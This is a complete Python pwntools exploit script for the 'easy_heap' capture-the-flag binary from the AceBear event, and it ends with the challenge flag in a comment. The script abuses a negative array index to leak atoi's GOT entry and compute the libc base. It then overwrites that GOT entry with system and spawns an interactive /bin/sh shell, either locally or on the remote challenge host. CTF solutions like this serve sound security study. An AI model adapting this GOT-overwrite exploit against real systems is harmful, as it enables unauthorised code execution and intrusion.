from pwn import *
import time
import sys

def easy_heap(DEBUG):
	t = 0.3
	def Add(index, name):
		r.sendline("1")
		r.recvuntil("Index: ")
		r.sendline(str(index))
		r.recvuntil("Input this name: ")
		r.send(name)
		time.sleep(t)
		res = r.recvuntil("Your choice:")
		return res
	
	def View(idx):
		r.sendline("4")
		r.recvuntil("Index: ")
		r.sendline(str(idx))
		res = r.recvuntil("Done!")
		r.recvuntil("Your choice:")
		return res
	
	def Delete(idx):
		r.sendline("3")
		r.recvuntil("Index: ")
		r.sendline(str(idx))
		res = r.recvuntil("Your choice:")
		return res
	
	def Edit(idx, name):
		r.sendline("2")
		r.recvuntil("Index: ")
		r.sendline(str(idx))
		r.recvuntil("Input new name: ")
		r.send(name)
		time.sleep(t)
		res = r.recvuntil("Your choice:")
		return res
	
	
	def Exit():
		r.sendline("5")
	
	if DEBUG=="1":
		t = 0.005
		r = process("./easy_heap")
		libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
		raw_input("debug?")
	elif DEBUG=="2":
		t = 0.01
		env = {
			'LD_PRELOAD': './easyheap_libc.so.6'
		}
		r = process("./easy_heap",env=env)
		libc = ELF('./easyheap_libc.so.6')
		raw_input("debug?")
	elif DEBUG=="3":
		offset_main_arena = 0x3c3af0
		libc = ELF('./easyheap_libc.so.6')
		HOST = 'easyheap.acebear.site'
		PORT = 3002
		r = remote(HOST,PORT)
	
	free_got = 0x804B018
	atoi_got = 0x0804B038
	stdout = 0x0804B084
	NAME = p32(atoi_got) # 0x0804B0E0
	AGE = 0x40
	r.recvuntil("Give me your name: ")
	r.sendline(NAME)
	r.recvuntil("Your age: ")
	r.sendline(str(AGE))
	r.recvuntil("Your choice: ")
	
	idx = -2147483632 # idx < 9, DWORD PTR [idx*4+0x0804B0A0] == 0x0804B0E0 (NAME)
	# leak atoi_got
	res = View(idx)
	atoi_got = u32(res.split(" is: ")[1][:4])
	baselibc = atoi_got - libc.symbols['atoi']
	system = baselibc + libc.symbols['system']
	str_bin_sh = baselibc+next(libc.search("/bin/sh"))
	
	log.info('atoi_got: %#x' % atoi_got)
	log.info('baselibc: %#x' % baselibc)
	log.info('system: %#x' % system)
	log.info('str_bin_sh: %#x' % str_bin_sh)
	
	# overwrite atoi_got by system address
	Edit(idx, p32(system))
	r.sendline("/bin/sh")
	
	r.interactive()

easy_heap(sys.argv[1])
# AceBear{m4yb3_h34p_i5_3a5y_f0r_y0u}